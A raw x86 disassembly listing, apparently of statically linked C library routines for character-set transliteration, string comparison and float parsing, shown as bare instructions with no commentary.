test eax, eax
je 0x8084727
mov dword [esp], 0x80aaa48
call section.
mov eax, dword [var_10h_2]
add esp, 0x1c
pop ebx
pop esi
pop edi
leave
ret
mov dword [esp], edx
call fcn.080845c0
test eax, eax
jne 0x8084712
mov edx, dword [edi]
mov eax, dword [edx]
mov dword [ebx], eax
mov eax, dword [edx + 4]
mov dword [ebx + 4], eax
mov eax, dword [edx + 8]
mov dword [ebx + 8], eax
mov eax, dword [edx + 0xc]
mov dword [ebx + 0xc], eax
mov eax, dword [edx + 0x10]
mov dword [ebx + 0x10], eax
mov eax, dword [edx + 0x14]
mov dword [ebx + 0x14], eax
mov eax, dword [edx + 0x18]
mov dword [ebx + 0x18], eax
mov eax, dword [edx + 0x1c]
mov dword [ebx + 0x1c], eax
inc dword [edx + 0x28]
jmp 0x808470b
mov eax, dword [ebx]
mov dword [esp], eax
call fcn.08053400
mov dword [var_18h], 0
inc eax
mov dword [var_14h], eax
mov eax, dword [0x80aacac]
test eax, eax
je 0x80848a2
cmp dword [var_14h], 4
jbe 0x80847b2
mov eax, dword [var_14h]
mov edi, 0x80a4c29
mov ecx, 3
add eax, dword [ebx]
cld
lea esi, [eax - 4]
repe cmpsb byte [esi], byte ptr es:[edi]
je 0x80847b9
mov dword [var_18h], 1
mov eax, dword [var_14h]
mov edx, dword [var_14h]
add eax, dword [0x80aaca8]
lea eax, [edx + eax + 0x2f]
mov dword [esp], eax
call fcn.08050fe0
test eax, eax
mov esi, eax
je 0x8084712
xor eax, eax
mov ecx, 0xb
mov edi, esi
cld
rep stosd dword es:[edi], eax
lea edx, [esi + 0x2c]
mov dword [esi], edx
mov dword [esp], edx
mov eax, dword [var_14h]
mov dword [var_8h], eax
mov eax, dword [ebx]
mov dword [var_4h], eax
call fcn.08053740
mov edi, dword [0x80aacac]
mov dword [esi + 0x20], eax
mov eax, dword [edi]
test eax, eax
jne 0x8084842
mov dword [esi + 0x20], 0
mov dword [var_8h], fcn.080845a0
mov dword [var_4h], 0x80aaa44
mov dword [esp], esi
call fcn.0807a190
test eax, eax
mov eax, 1
cmovne eax, dword [var_10h_2]
mov dword [var_10h_2], eax
jmp 0x8084712
mov dword [var_4h], eax
mov eax, dword [esi + 0x20]
mov dword [esp], eax
call fcn.080773c0
mov edx, dword [var_14h]
mov dword [esp], eax
mov dword [var_8h], edx
mov edx, dword [ebx]
mov dword [var_4h], edx
call fcn.08053740
mov edx, eax
mov eax, dword [var_18h]
test eax, eax
je 0x8084875
mov dword [edx], 0x6f732e
mov dword [esp], esi
call fcn.080845c0
test eax, eax
je 0x8084896
add edi, 8
mov eax, dword [edi]
test eax, eax
jne 0x8084842
mov edi, dword [var_10h_2]
test edi, edi
je 0x8084817
jmp 0x8084810
mov dword [var_10h_2], 0
jmp 0x8084817
call fcn.08057930
jmp 0x8084795
mov dword [var_ch], str.__gconv_translit_find
mov dword [var_8h], 0x141
mov dword [var_4h], str.gconv_trans.c
mov dword [esp], str.trans__name_____void__0_
call fcn.0805efc0
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
sub esp, 0x10
mov dword [var_4h], ebx
mov dword [var_sp_4h], 1
mov ebx, dword [arg_8h]
mov eax, dword [ebx + 0x20]
mov dword [esp], eax
call fcn.080836e0
mov edx, 1
test eax, eax
mov dword [ebx + 0x24], eax
jne 0x80845f2
mov ebx, dword [var_4h]
mov eax, edx
leave
ret
mov dword [var_sp_4h], str.gconv_trans_context
mov dword [esp], eax
call fcn.08083750
test eax, eax
mov edx, eax
je 0x808468f
lea eax, [ebx + 0xc]
mov dword [var_8h], eax
lea eax, [ebx + 8]
mov dword [var_sp_4h], eax
mov eax, dword [ebx]
mov dword [esp], eax
call edx
test eax, eax
jne 0x808468f
mov dword [var_sp_4h], str.gconv_trans
mov eax, dword [ebx + 0x24]
mov dword [esp], eax
call fcn.08083750
test eax, eax
mov dword [ebx + 0x10], eax
je 0x808468f
mov dword [var_sp_4h], str.gconv_trans_init
mov eax, dword [ebx + 0x24]
mov dword [esp], eax
call fcn.08083750
mov dword [ebx + 0x18], eax
mov dword [var_sp_4h], str.gconv_trans_context
mov eax, dword [ebx + 0x24]
mov dword [esp], eax
call fcn.08083750
mov dword [ebx + 0x14], eax
mov dword [var_sp_4h], str.gconv_trans_end
mov eax, dword [ebx + 0x24]
mov dword [esp], eax
call fcn.08083750
xor edx, edx
mov dword [ebx + 0x1c], eax
mov dword [ebx + 0x28], 1
jmp 0x80845eb
mov eax, dword [ebx + 0x24]
mov dword [esp], eax
call fcn.08083790
mov edx, 1
mov dword [ebx + 0x24], 0
jmp 0x80845eb
mov eax, 0
push ebp
test eax, eax
mov ebp, esp
je 0x8084b15
mov dword [arg_ch], ebp
leave
jmp section.
leave
ret
mov ecx, dword [arg_4h]
mov eax, dword [arg_8h]
mov edx, dword [ecx + 0x14]
mov ebx, dword [ecx]
mov esi, dword [ecx + 4]
mov edi, dword [ecx + 8]
mov ebp, dword [ecx + 0xc]
mov esp, dword [ecx + 0x10]
jmp edx
push ebp
mov ebp, esp
sub esp, 0xc
mov dword [var_8h], edi
mov ecx, dword [arg_ch]
mov dword [esp], ebx
mov edi, dword [arg_8h]
mov dword [var_4h], esi
cmp edi, ecx
je 0x808dd62
mov eax, dword [arg_10h]
test eax, eax
jne 0x808dd71
xor eax, eax
mov ebx, dword [esp]
mov esi, dword [var_4h]
mov edi, dword [var_8h]
leave
ret
mov eax, dword [arg_14h]
movzx ebx, byte [edi]
mov esi, dword [eax + 0x38]
movzx eax, byte [ecx]
inc ecx
movzx edx, bl
mov edx, dword [esi + edx*4]
sub edx, dword [esi + eax*4]
mov eax, edx
jne 0x808dd64
nop
lea esi, [esi]
inc edi
test bl, bl
je 0x808dd64
dec dword [arg_10h]
je 0x808dd64
movzx ebx, byte [edi]
movzx eax, bl
mov edx, dword [esi + eax*4]
movzx eax, byte [ecx]
inc ecx
sub edx, dword [esi + eax*4]
mov eax, edx
je 0x808dd90
jmp 0x808dd64
push ebp
mov ebp, esp
push edi
xor edi, edi
push esi
xor esi, esi
push ebx
sub esp, 0x18
mov eax, dword [arg_14h]
mov ebx, dword [arg_8h]
mov dword [eax], 0
lea esi, [esi]
cmp edi, 9
je 0x80861d9
movzx ecx, byte [ebx]
lea eax, [ecx - 0x30]
cmp al, 9
jbe 0x80860ab
mov eax, dword [arg_24h]
test eax, eax
je 0x80860a5
mov eax, dword [arg_24h]
cmp cl, byte [eax]
je 0x808619f
add ebx, dword [arg_20h]
movzx ecx, byte [ebx]
movsx eax, cl
dec dword [arg_ch]
lea edx, [esi + esi*4]
lea esi, [eax + edx*2 - 0x30]
inc ebx
inc edi
mov eax, dword [arg_ch]
test eax, eax
jg 0x8086080
mov edx, dword [arg_18h]
mov eax, dword [edx]
test eax, eax
jle 0x8086193
lea edx, [eax + edi]
cmp edx, 9
jg 0x8086193
imul esi, dword [eax*4 + 0x80a6080]
mov ecx, dword [arg_18h]
mov edx, dword [edx*4 + 0x80a6080]
mov dword [ecx], 0
mov ecx, dword [arg_14h]
mov eax, dword [ecx]
test eax, eax
jne 0x8086110
mov eax, dword [arg_10h]
mov dword [eax], esi
mov dword [ecx], 1
add esp, 0x18
mov eax, ebx
pop ebx
pop esi
pop edi
leave
ret
mov dword [var_ch], edx
mov dword [var_8h], eax
mov edx, dword [arg_10h]
mov dword [var_4h], edx
mov dword [esp], edx
call fcn.0808cae0
mov dword [var_14h], eax
mov edi, dword [arg_10h]
mov eax, dword [arg_14h]
mov ecx, dword [eax]
add edi, 4
mov eax, dword [arg_10h]
mov edx, dword [eax]
lea eax, [edx + esi]
mov esi, dword [arg_10h]
cmp eax, edx
mov dword [esi], eax
mov esi, edi
jae 0x8086179
dec ecx
je 0x808615d
mov edx, dword [edi]
add edi, 4
inc edx
mov dword [esi], edx
add esi, 4
test edx, edx
jne 0x8086179
dec ecx
jne 0x808614b
mov eax, 1
add dword [var_14h], eax
je 0x8086106
mov edx, dword [arg_14h]
mov esi, dword [var_14h]
mov ecx, dword [arg_10h]
mov eax, dword [edx]
mov dword [ecx + eax*4], esi
inc dword [edx]
jmp 0x8086106
cmp esi, edi
je 0x808618f
xor edx, edx
dec ecx
cmp edx, ecx
jge 0x808618f
mov eax, dword [edi + edx*4]
mov dword [esi + edx*4], eax
inc edx
cmp edx, ecx
jl 0x8086184
xor eax, eax
jmp 0x8086162
mov edx, dword [edi*4 + 0x80a6080]
jmp 0x80860f2
movzx eax, byte [eax + 1]
mov edx, 1
test al, al
je 0x80861d0
lea esi, [esi]
cmp al, byte [edx + ebx]
jne 0x80861c1
mov ecx, dword [arg_24h]
inc edx
movzx eax, byte [edx + ecx]
test al, al
jne 0x80861b0
test al, al
jne 0x80860a5
add ebx, edx
jmp 0x80860a8
mov ecx, dword [arg_24h]
movzx eax, byte [ecx + 1]
jmp 0x80861c1
mov edx, dword [arg_14h]
mov eax, dword [edx]
test eax, eax
jne 0x80861f6
mov ecx, dword [arg_10h]
mov dword [ecx], esi
mov dword [edx], 1
xor edi, edi
xor esi, esi
jmp 0x8086089
mov dword [var_8h], eax
mov dword [var_ch], 0x3b9aca00
mov eax, dword [arg_10h]
mov dword [var_4h], eax
mov dword [esp], eax
call fcn.0808cae0
mov dword [var_10h], eax
mov edx, dword [arg_14h]
mov edi, dword [arg_10h]
mov eax, dword [arg_10h]
mov ecx, dword [edx]
add edi, 4
mov edx, dword [eax]
lea eax, [edx + esi]
mov esi, dword [arg_10h]
cmp eax, edx
mov dword [esi], eax
mov esi, edi
jae 0x8086263
dec ecx
je 0x8086247
mov edx, dword [edi]
add edi, 4
inc edx
mov dword [esi], edx
add esi, 4
test edx, edx
jne 0x8086263
dec ecx
jne 0x8086235
mov eax, 1
add dword [var_10h], eax
je 0x80861ed
mov edx, dword [arg_14h]
mov esi, dword [var_10h]
mov ecx, dword [arg_10h]
mov eax, dword [edx]
mov dword [ecx + eax*4], esi
inc dword [edx]
jmp 0x80861ed
cmp esi, edi
je 0x808627b
xor edx, edx
dec ecx
cmp edx, ecx
jge 0x808627b
mov esi, esi
mov eax, dword [edi + edx*4]
mov dword [esi + edx*4], eax
inc edx
cmp edx, ecx
jl 0x8086270
xor eax, eax
jmp 0x808624c
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x24
mov edi, dword [arg_1ch]
mov ecx, dword [arg_14h]
mov eax, dword [arg_8h]
mov ebx, dword [arg_ch]
mov edx, dword [arg_10h]
mov dword [var_18h], ecx
mov dword [var_10h], eax
cmp ebx, 0xffffff82
mov eax, dword [arg_18h]
mov dword [var_14h], edx
mov dword [var_1ch], eax
jge 0x8085f28
mov esi, 0xffffff82
sub esi, ebx
cmp esi, 0x18
jg 0x8086048
movzx ecx, byte [var_1ch]
mov eax, 1
mov edx, edi
or edx, 1
shl eax, cl
dec eax
test dword [var_18h], eax
cmovne edi, edx
cmp esi, 0x18
je 0x8086021
cmp esi, 0x1f
jle 0x8085feb
mov ecx, esi
lea eax, [esi + 0x1e]
mov edx, dword [var_10h]
dec ecx
cmovns eax, ecx
mov ebx, ecx
sar eax, 5
mov edx, dword [edx + eax*4]
shl eax, 5
sub ebx, eax
mov dword [var_1ch], ebx
mov dword [var_18h], edx
xor edx, edx
lea esi, [esi]
cmp ecx, 0xffffffff
lea eax, [esi + 0x1e]
cmovg eax, ecx
sar eax, 5
cmp edx, eax
jge 0x8085eb3
mov ebx, dword [var_10h]
mov eax, edi
or eax, 1
mov ebx, dword [ebx + edx*4]
test ebx, ebx
cmovne edi, eax
inc edx
jmp 0x8085e90
movzx ecx, byte [var_1ch]
mov ebx, 1
mov edx, edi
mov eax, ebx
or edx, 1
shl eax, cl
mov ecx, esi
dec eax
test dword [var_18h], eax
lea eax, [esi + 0x1f]
cmovne edi, edx
cmp esi, 0xffffffff
cmovg eax, esi
sar eax, 5
mov edx, eax
shl edx, 5
sub ecx, edx
mov dword [var_ch], ecx
mov ecx, ebx
sub ecx, eax
mov dword [var_8h], ecx
mov ebx, dword [var_10h]
lea eax, [ebx + eax*4]
mov dword [esp], ebx
mov dword [var_sp_4h], eax
call fcn.0808c750
xor edx, edx
cmp esi, 0xffffffff
lea eax, [esi + 0x1f]
cmovg eax, esi
sar eax, 5
cmp edx, eax
jge 0x8085f23
mov ebx, dword [var_10h]
mov ecx, edx
inc edx
sub ecx, eax
mov dword [ebx + ecx*4 + 4], 0
jmp 0x8085f01
mov ebx, 0xffffff81
movzx ecx, byte [var_1ch]
mov eax, dword [var_18h]
shr eax, cl
test al, 1
je 0x8085f68
test edi, edi
jne 0x8085fe1
mov eax, dword [var_10h]
mov edx, dword [eax]
test dl, 1
jne 0x8085f54
mov eax, 1
shl eax, cl
dec eax
test dword [var_18h], eax
je 0x8085f68
lea eax, [edx + 1]
mov edx, dword [var_10h]
test eax, 0x1000000
mov dword [edx], eax
jne 0x8085fb9
cmp ebx, 0xffffff81
je 0x8085faa
cmp ebx, 0x80
jle 0x8085f8f
mov edx, dword [var_14h]
mov eax, 0x7f800000
test edx, edx
cmovne eax, dword [0x80a6100]
mov dword [var_20h], eax
fld dword [ebp - 0x20]
add esp, 0x24
pop ebx
pop esi
pop edi
leave
ret
mov eax, dword [var_14h]
mov edx, dword [var_10h]
mov dword [arg_ch], ebx
mov dword [arg_10h], eax
mov dword [arg_8h], edx
add esp, 0x24
pop ebx
pop esi
pop edi
leave
jmp 0x808d830
test eax, 0x800000
mov eax, 0xffffff82
cmovne ebx, eax
jmp 0x8085f68
mov dword [var_ch], 1
mov dword [var_8h], 1
mov dword [var_sp_4h], edx
mov dword [esp], edx
inc ebx
call fcn.0808c750
mov ecx, dword [var_10h]
or dword [ecx], 0x800000
jmp 0x8085f68
mov eax, dword [var_10h]
mov edx, dword [eax]
jmp 0x8085f54
test esi, esi
jle 0x8085f23
mov eax, dword [var_10h]
lea edx, [esi - 1]
mov dword [var_1ch], edx
mov eax, dword [eax]
mov dword [var_18h], eax
mov dword [var_8h], 1
mov dword [var_ch], esi
mov ecx, dword [var_10h]
mov dword [var_sp_4h], ecx
mov dword [esp], ecx
call fcn.0808c750
jmp 0x8085f23
mov ebx, dword [var_10h]
mov eax, edi
mov dword [var_1ch], 0x17
or eax, 1
mov ebx, dword [ebx]
test ebx, ebx
mov dword [var_18h], ebx
cmovne edi, eax
mov eax, dword [var_10h]
mov dword [eax], 0
jmp 0x8085f23
call fcn.08048b20
mov dword [eax], 0x21
mov eax, 0
jmp 0x8085f81
lea esi, [esi]
push ebp
mov ebp, esp
push edi
xor edi, edi
push esi
xor esi, esi
push ebx
sub esp, 0x18
mov eax, dword [arg_14h]
mov ebx, dword [arg_8h]
mov dword [eax], 0
lea esi, [esi]
cmp edi, 9
je 0x80861d9
movzx ecx, byte [ebx]
lea eax, [ecx - 0x30]
cmp al, 9
jbe 0x80860ab
mov eax, dword [arg_24h]
test eax, eax
je 0x80860a5
mov eax, dword [arg_24h]
cmp cl, byte [eax]
je 0x808619f
add ebx, dword [arg_20h]
movzx ecx, byte [ebx]
movsx eax, cl
dec dword [arg_ch]
lea edx, [esi + esi*4]
lea esi, [eax + edx*2 - 0x30]
inc ebx
inc edi
mov eax, dword [arg_ch]
test eax, eax
jg 0x8086080
mov edx, dword [arg_18h]
mov eax, dword [edx]
test eax, eax
jle 0x8086193
lea edx, [eax + edi]
cmp edx, 9
jg 0x8086193
imul esi, dword [eax*4 + 0x80a6080]
mov ecx, dword [arg_18h]
mov edx, dword [edx*4 + 0x80a6080]
mov dword [ecx], 0
mov ecx, dword [arg_14h]
mov eax, dword [ecx]
test eax, eax
jne 0x8086110
mov eax, dword [arg_10h]
mov dword [eax], esi
mov dword [ecx], 1
add esp, 0x18
mov eax, ebx
pop ebx
pop esi
pop edi
leave
ret
mov dword [var_ch], edx
mov dword [var_8h], eax
mov edx, dword [arg_10h]
mov dword [var_4h], edx
mov dword [esp], edx
call fcn.0808cae0
mov dword [var_14h], eax
mov edi, dword [arg_10h]
mov eax, dword [arg_14h]
mov ecx, dword [eax]
add edi, 4
mov eax, dword [arg_10h]
mov edx, dword [eax]
lea eax, [edx + esi]
mov esi, dword [arg_10h]
cmp eax, edx
mov dword [esi], eax
mov esi, edi
jae 0x8086179
dec ecx
je 0x808615d
mov edx, dword [edi]
add edi, 4
inc edx
mov dword [esi], edx
add esi, 4
test edx, edx
jne 0x8086179
dec ecx
jne 0x808614b
mov eax, 1
add dword [var_14h], eax
je 0x8086106
mov edx, dword [arg_14h]
mov esi, dword [var_14h]
mov ecx, dword [arg_10h]
mov eax, dword [edx]
mov dword [ecx + eax*4], esi
inc dword [edx]
jmp 0x8086106
cmp esi, edi
je 0x808618f
xor edx, edx
dec ecx
cmp edx, ecx
jge 0x808618f
mov eax, dword [edi + edx*4]
mov dword [esi + edx*4], eax
inc edx
cmp edx, ecx
jl 0x8086184
xor eax, eax
jmp 0x8086162
mov edx, dword [edi*4 + 0x80a6080]
jmp 0x80860f2
movzx eax, byte [eax + 1]
mov edx, 1
test al, al
je 0x80861d0
lea esi, [esi]
cmp al, byte [edx + ebx]
jne 0x80861c1
mov ecx, dword [arg_24h]
inc edx
movzx eax, byte [edx + ecx]
test al, al
jne 0x80861b0
test al, al
jne 0x80860a5
add ebx, edx
jmp 0x80860a8
mov ecx, dword [arg_24h]
movzx eax, byte [ecx + 1]
jmp 0x80861c1
mov edx, dword [arg_14h]
mov eax, dword [edx]
test eax, eax
jne 0x80861f6
mov ecx, dword [arg_10h]
mov dword [ecx], esi
mov dword [edx], 1
xor edi, edi
xor esi, esi
jmp 0x8086089
mov dword [var_8h], eax
mov dword [var_ch], 0x3b9aca00
mov eax, dword [arg_10h]
mov dword [var_4h], eax
mov dword [esp], eax
call fcn.0808cae0
mov dword [var_10h], eax
mov edx, dword [arg_14h]
mov edi, dword [arg_10h]
mov eax, dword [arg_10h]
mov ecx, dword [edx]
add edi, 4
mov edx, dword [eax]
lea eax, [edx + esi]
mov esi, dword [arg_10h]
cmp eax, edx
mov dword [esi], eax
mov esi, edi
jae 0x8086263
dec ecx
je 0x8086247
mov edx, dword [edi]
add edi, 4
inc edx
mov dword [esi], edx
add esi, 4
test edx, edx
jne 0x8086263
dec ecx
jne 0x8086235
mov eax, 1
add dword [var_10h], eax
je 0x80861ed
mov edx, dword [arg_14h]
mov esi, dword [var_10h]
mov ecx, dword [arg_10h]
mov eax, dword [edx]
mov dword [ecx + eax*4], esi
inc dword [edx]
jmp 0x80861ed
cmp esi, edi
je 0x808627b
xor edx, edx
dec ecx
cmp edx, ecx
jge 0x808627b
mov esi, esi
mov eax, dword [edi + edx*4]
mov dword [esi + edx*4], eax
inc edx
cmp edx, ecx
jl 0x8086270
xor eax, eax
jmp 0x808624c
nop
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x11c
mov ecx, dword [arg_10h]
mov eax, dword [arg_14h]
mov dword [var_64h], 0xa
mov dword [var_8ch], 0
test ecx, ecx
mov edx, dword [eax + 4]
je 0x80862d6
mov ecx, dword [edx + 0x2c]
mov dword [var_90h], ecx
movzx eax, byte [ecx]
test al, al
jle 0x80862d6
cmp al, 0x7f
je 0x80862d6
mov esi, dword [edx + 0x28]
mov dword [var_8ch], esi
cmp byte [esi], 0
jne 0x80862e0
mov dword [var_8ch], 0
mov dword [var_90h], 0
mov edx, dword [edx + 0x24]
mov dword [var_88h], edx
mov dword [esp], edx
call fcn.08053400
mov edi, dword [arg_8h]
mov dword [var_6ch], 0
mov dword [var_94h], eax
mov dword [var_58h], 0
mov dword [var_60h], 0
mov eax, dword [arg_14h]
dec edi
mov edx, dword [eax + 0x34]
inc edi
movzx esi, byte [edi]
mov ecx, esi
movsx eax, cl
test byte [edx + eax*2 + 1], 0x20
jne 0x8086316
cmp cl, 0x2d
je 0x8087bd8
cmp cl, 0x2b
je 0x8087bcf
mov edx, dword [var_88h]
xor ebx, ebx
movzx edx, byte [edx]
test dl, dl
mov byte [var_fdh], dl
mov byte [var_edh], dl
je 0x8087bc4
mov eax, edx
lea esi, [esi]
cmp byte [ebx + edi], al
jne 0x8087bb7
mov ecx, dword [var_88h]
inc ebx
movzx eax, byte [ebx + ecx]
test al, al
jne 0x8086360
movzx eax, byte [ebx + edi]
cmp al, 0x2f
jle 0x8086388
cmp al, 0x39
jle 0x8086524
lea eax, [esi - 0x30]
cmp al, 9
jbe 0x8086524
mov ecx, esi
mov esi, dword [arg_14h]
movsx eax, cl
mov ebx, eax
mov ecx, dword [esi + 0x38]
cmp dword [ecx + eax*4], 0x69
je 0x80864b0
cmp dword [ecx + ebx*4], 0x6e
jne 0x8086497
mov ecx, dword [arg_14h]
mov dword [var_8h], 3
mov dword [var_4h], 0x80a0fb8
mov dword [esp], edi
mov dword [var_ch], ecx
call fcn.0808dd40
test eax, eax
jne 0x8086497
add edi, 3
mov esi, 0x7fc00000
cmp byte [edi], 0x28
je 0x808640d
mov eax, dword [arg_ch]
test eax, eax
je 0x80863f4
mov eax, dword [arg_ch]
mov dword [eax], edi
mov eax, esi
mov dword [var_104h], eax
fld dword [ebp - 0x104]
add esp, 0x11c
pop ebx
pop esi
pop edi
leave
ret
mov eax, dword [arg_14h]
mov ebx, edi
mov ecx, dword [eax + 0x38]
inc edi
movzx edx, byte [edi]
lea eax, [edx - 0x30]
cmp al, 9
jbe 0x8086415
movsx eax, dl
mov eax, dword [ecx + eax*4]
cmp eax, 0x60
jle 0x8086430
cmp eax, 0x7a
jle 0x8086415
cmp dl, 0x5f
je 0x8086415
cmp dl, 0x29
je 0x808643e
mov edi, ebx
jmp 0x80863e8
mov edx, dword [arg_14h]
lea eax, [var_50h]
mov dword [var_ch], 0
mov dword [var_4h], eax
mov dword [var_8h], 0
lea eax, [ebx + 1]
mov dword [esp], eax
mov dword [var_10h], edx
call fcn.080856c0
cmp dword [var_50h], edi
mov ecx, eax
jne 0x80863e8
xor edx, edx
and eax, 0x7fffff
mov esi, edx
or esi, eax
jne 0x8086484
mov ecx, 0x400000
mov eax, ecx
and eax, 0x7fffff
or eax, 0x7f800000
mov esi, eax
jmp 0x80863e8
mov eax, dword [arg_ch]
test eax, eax
je 0x80864a6
mov ecx, dword [arg_8h]
mov edx, dword [arg_ch]
mov dword [edx], ecx
mov eax, 0
jmp 0x80863f6
mov dword [var_ch], esi
mov dword [var_8h], 3
mov dword [var_4h], 0x80a0fc0
mov dword [esp], edi
call fcn.0808dd40
test eax, eax
jne 0x8086519
mov edx, dword [arg_ch]
test edx, edx
je 0x8086503
lea ebx, [edi + 3]
mov dword [var_ch], esi
mov dword [var_8h], 5
mov dword [esp], ebx
mov dword [var_4h], str.inity
call fcn.0808dd40
test eax, eax
lea edx, [edi + 8]
mov eax, dword [arg_ch]
cmove ebx, edx
mov dword [eax], ebx
mov ecx, dword [var_60h]
mov eax, 0x7f800000
test ecx, ecx
cmovne eax, dword [0x80a6100]
jmp 0x80863f6
mov edx, dword [arg_14h]
mov ecx, dword [edx + 0x38]
jmp 0x80863aa
mov eax, esi
cmp al, 0x30
je 0x8087b87
mov eax, dword [var_8ch]
mov dword [var_74h], edi
test eax, eax
je 0x8087b6d
mov ecx, dword [var_8ch]
movzx edx, byte [ecx]
mov eax, esi
cmp al, 0x30
je 0x8086576
xor ebx, ebx
test dl, dl
je 0x8087b5f
mov ecx, dword [var_8ch]
movzx eax, byte [ecx]
mov ecx, esi
cmp cl, al
jne 0x8086580
mov ecx, dword [var_8ch]
inc ebx
movzx eax, byte [ebx + ecx]
test al, al
jne 0x8086561
inc edi
movzx esi, byte [edi]
jmp 0x8086548
lea esi, [esi]
test al, al
je 0x8086576
lea eax, [esi - 0x30]
cmp al, 9
jbe 0x8086595
cmp dword [var_64h], 0x10
je 0x8087b0e
mov dword [var_70h], edi
mov dword [var_7ch], 0
nop
lea eax, [esi - 0x30]
cmp al, 9
jbe 0x8087b06
cmp dword [var_64h], 0x10
je 0x8087ae6
mov eax, dword [var_8ch]
test eax, eax
je 0x80865f0
mov ecx, dword [var_8ch]
xor ebx, ebx
movzx eax, byte [ecx]
test al, al
je 0x8087ad8
cmp al, byte [ebx + edi]
jne 0x80865ec
mov edx, dword [var_8ch]
inc ebx
movzx eax, byte [ebx + edx]
test al, al
jne 0x80865d2
inc edi
movzx esi, byte [edi]
jmp 0x80865a0
test al, al
je 0x80865e6
mov eax, dword [var_90h]
test eax, eax
je 0x80877c3
mov eax, dword [var_7ch]
test eax, eax
jle 0x80877c3
mov ecx, dword [var_74h]
mov eax, dword [var_90h]
mov dword [var_4h], edi
mov edx, dword [var_8ch]
mov dword [esp], ecx
mov dword [var_ch], eax
mov dword [var_8h], edx
call fcn.08049980
cmp edi, eax
mov ecx, eax
je 0x80877b4
cmp eax, dword [var_74h]
je 0x808779c
cmp eax, dword [var_70h]
jb 0x808778c
mov ecx, dword [var_70h]
mov edi, eax
mov dword [var_7ch], 0
cmp ecx, eax
jae 0x8086670
movzx eax, byte [ecx]
mov edx, dword [var_7ch]
inc edx
sub eax, 0x30
cmp al, 9
cmova edx, dword [var_7ch]
inc ecx
cmp ecx, edi
mov dword [var_7ch], edx
jb 0x8086658
mov ecx, dword [var_7ch]
mov dword [var_84h], 0
mov dword [var_80h], ecx
mov ebx, dword [arg_ch]
test ebx, ebx
je 0x808668c
mov edx, dword [arg_ch]
mov dword [edx], edi
mov ecx, dword [var_7ch]
test ecx, ecx
jne 0x80866a9
mov edx, dword [var_60h]
mov eax, 0
test edx, edx
cmovne eax, dword [0x80a6104]
jmp 0x80863f6
mov eax, dword [var_84h]
test eax, eax
je 0x8086743
mov ecx, dword [var_88h]
mov esi, dword [var_88h]
movzx ecx, byte [ecx]
mov byte [var_fdh], cl
movzx edx, byte [esi + 1]
mov ecx, dword [var_70h]
movzx eax, byte [var_fdh]
cmp byte [ecx], al
je 0x80866e3
inc dword [var_70h]
jmp 0x80866d0
test dl, dl
mov ebx, 1
je 0x8087780
mov esi, dword [var_88h]
movzx eax, byte [esi + 1]
mov ecx, dword [var_70h]
cmp al, byte [ebx + ecx]
jne 0x8087771
mov esi, dword [var_88h]
inc ebx
movzx eax, byte [ebx + esi]
test al, al
jne 0x80866fa
mov eax, dword [var_84h]
add eax, dword [var_94h]
add dword [var_70h], eax
cmp dword [var_64h], 0x10
je 0x808775e
mov edx, dword [var_58h]
sub edx, dword [var_84h]
mov esi, dword [var_84h]
mov dword [var_58h], edx
sub dword [var_7ch], esi
cmp dword [var_64h], 0x10
je 0x8087597
mov ebx, dword [var_58h]
test ebx, ebx
mov edx, ebx
js 0x8087581
mov eax, dword [var_7ch]
sub eax, dword [var_80h]
cmp ebx, eax
cmovle eax, ebx
add dword [var_80h], eax
mov ebx, edx
sub ebx, eax
mov eax, dword [var_80h]
mov dword [var_58h], ebx
add eax, ebx
cmp eax, 0x27
jg 0x80868b9
cmp ebx, 0xffffffd4
jl 0x8087571
mov esi, dword [var_80h]
test esi, esi
jle 0x8086a28
mov esi, dword [var_88h]
mov edx, dword [var_8ch]
lea eax, [var_58h]
mov ecx, dword [var_94h]
mov dword [var_10h], eax
mov eax, dword [var_70h]
mov dword [var_14h], esi
mov dword [var_1ch], edx
mov esi, dword [var_80h]
mov dword [var_18h], ecx
lea edx, [var_5ch]
mov dword [esp], eax
lea ecx, [var_2ch]
mov dword [var_ch], edx
mov dword [var_8h], ecx
mov dword [var_4h], esi
call fcn.08086060
mov ebx, dword [var_58h]
mov dword [var_70h], eax
test ebx, ebx
jle 0x808689f
lea edx, [var_2ch]
lea ecx, [var_4ch]
mov edi, 1
mov dword [var_a0h], edx
mov dword [var_a4h], ecx
mov dword [var_a8h], 0x80a7020
test edi, ebx
je 0x808687f
mov eax, dword [var_a8h]
mov edx, dword [var_5ch]
xor ebx, edi
mov dword [var_58h], ebx
mov esi, dword [eax + 4]
sub esi, 2
cmp edx, esi
jl 0x8087542
mov dword [var_10h], esi
mov eax, dword [eax]
mov dword [var_8h], edx
mov edx, dword [var_a4h]
lea eax, [eax*4 + 0x80a6248]
mov dword [var_ch], eax
mov dword [esp], edx
mov eax, dword [var_a0h]
mov dword [var_4h], eax
call fcn.0808c7c0
mov edx, eax
mov eax, dword [var_5ch]
add eax, esi
test edx, edx
mov dword [var_5ch], eax
jne 0x8086864
dec eax
mov dword [var_5ch], eax
mov eax, dword [var_a0h]
mov esi, dword [var_a4h]
mov ebx, dword [var_58h]
mov dword [var_a0h], esi
mov dword [var_a4h], eax
add edi, edi
add dword [var_a8h], 0x10
test ebx, ebx
jne 0x8086805
lea eax, [var_4ch]
cmp dword [var_a0h], eax
je 0x808752c
mov esi, dword [var_5ch]
bsr edx, dword [ebp + esi*4 - 0x30]
xor edx, 0x1f
mov eax, esi
shl eax, 5
sub eax, edx
mov dword [var_6ch], eax
add eax, 0xffffff80
jle 0x80868c9
call fcn.08048b20
mov dword [eax], 0x22
jmp 0x8086503
cmp dword [var_6ch], 0x18
jle 0x8086a09
mov edx, dword [var_6ch]
mov eax, dword [var_6ch]
mov dword [var_b4h], 0x1f
add edx, 7
sub eax, 0x18
mov edi, eax
cmovs edi, edx
sar edi, 5
mov edx, edi
lea ecx, [edi - 1]
shl edx, 5
sub eax, edx
mov dword [var_ach], eax
cmovne ecx, edi
mov edx, dword [var_ach]
dec eax
mov dword [var_b0h], ecx
test edx, edx
cmove eax, dword [var_b4h]
mov dword [var_b4h], eax
jne 0x8086999
mov eax, dword [ebp + edi*4 - 0x2c]
mov dword [var_54h], eax
mov eax, dword [var_2ch]
xor ebx, ebx
test eax, eax
jne 0x808693b
